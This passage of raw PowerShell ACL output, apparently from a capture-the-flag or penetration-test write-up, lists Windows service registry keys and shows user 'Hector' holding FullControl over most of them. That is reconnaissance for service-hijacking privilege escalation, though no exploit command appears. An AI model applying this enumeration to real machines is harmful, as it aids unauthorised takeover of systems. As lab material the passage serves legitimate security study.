Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PimIndexMaintenanceSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PktMon</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PktMon</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pla</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pla</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PlugPlay</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PlugPlay</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pmem</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pmem</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PNPMEM</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PNPMEM</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PolicyAgent</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PolicyAgent</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PortProxy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PortProxy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Power</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Power</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PptpMiniport</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PptpMiniport</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintNotify</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintNotify</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : PrintWorkflowUserSvc</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : PrintWorkflowUserSvc_42246</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : PrintWorkflowUserSvc_4248c</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : PrintWorkflowUserSvc_80d08</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : PrintWorkflowUserSvc_ee306</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PrintWorkflowUserSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Processor</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Processor</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ProfSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ProfSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Psched</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Psched</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PushToInstall</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\PushToInstall</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pvscsi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\pvscsi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qebdrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qebdrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qefcoe</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qefcoe</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qeois</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qeois</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ql2300i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ql2300i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ql40xx2i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ql40xx2i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qlfcoei</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\qlfcoei</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\QWAVE</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\QWAVE</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\QWAVEdrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\QWAVEdrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ramdisk</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ramdisk</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasAcd</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasAcd</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasAgileVpn</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasAgileVpn</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasAuto</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasAuto</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasGre</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasGre</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Rasl2tp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Rasl2tp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasMan</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasMan</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasPppoe</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasPppoe</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasSstp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RasSstp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rdbss</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rdbss</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDMANDK</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDMANDK</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rdpbus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rdpbus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDPDR</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDPDR</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDPNP</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDPNP</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDPUDD</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RDPUDD</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RdpVideoMiniport</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RdpVideoMiniport</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ReFS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ReFS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ReFSv1</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ReFSv1</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RemoteAccess</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RemoteAccess</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RemoteRegistry</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RemoteRegistry</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RFCOMM</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RFCOMM</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhelfltr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhelfltr</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  SetValue, CreateSubKey, Delete, ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -1073676288</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhelnet</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhelnet</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span 